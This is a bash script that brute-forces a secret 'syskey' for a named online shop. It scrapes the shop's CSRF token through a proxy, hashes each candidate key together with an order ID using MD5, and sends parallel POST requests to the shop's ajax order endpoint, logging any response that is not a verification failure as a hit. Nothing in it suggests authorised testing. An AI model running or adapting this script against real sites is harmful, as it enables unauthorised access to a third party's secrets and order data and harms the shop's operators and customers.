#!/bin/bash
# Usage: bash xuxin66_syskey_fast.sh OID KEYFILE [PARALLEL]
source /data/config/proxy.env
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
BASE="https://xuxin66.top/shop"
CK=/tmp/xuxin66_d6f_ck.txt
OID="$1"
KEYFILE="$2"
P="${3:-10}"
HITFILE=/tmp/xuxin66_syskey_hit.txt
rm -f "$HITFILE"
curl -sk -x "$PROXY_URL" -c $CK -b $CK --max-time 15 -A "$UA" "$BASE/" -o /tmp/d6f_home.html
CSRF=$(python3 -c "import re;h=open('/tmp/d6f_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*\"([a-f0-9]+)\"',h);print(m.group(1) if m else '')")
echo CSRF=$CSRF OID=$OID P=$P keys=$(wc -l <"$KEYFILE")

try_one() {
  key="$1"
  [ -f "$HITFILE" ] && return 0
  sk=$(printf '%s' "${OID}${key}${OID}" | md5sum | awk '{print $1}')
  r=$(curl -sk -x "$PROXY_URL" -b "$CK" -c "$CK" --max-time 4 -A "$UA" -e "$BASE/" \
    -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "id=$OID" --data-urlencode "skey=$sk" --data-urlencode "csrf_token=$CSRF" \
    "$BASE/ajax.php?act=order" 2>/dev/null)
  if [ -n "$r" ] && ! echo "$r" | grep -q '验证失败'; then
    echo "HIT|$OID|$key|$sk|$r" | tee -a "$HITFILE"
  fi
}
export -f try_one
export PROXY_URL CK BASE UA CSRF OID HITFILE

cat "$KEYFILE" | xargs -P "$P" -I{} bash -c 'try_one "$@"' _ {}
if [ -f "$HITFILE" ]; then cat "$HITFILE"; else echo "MISS|$OID"; fi
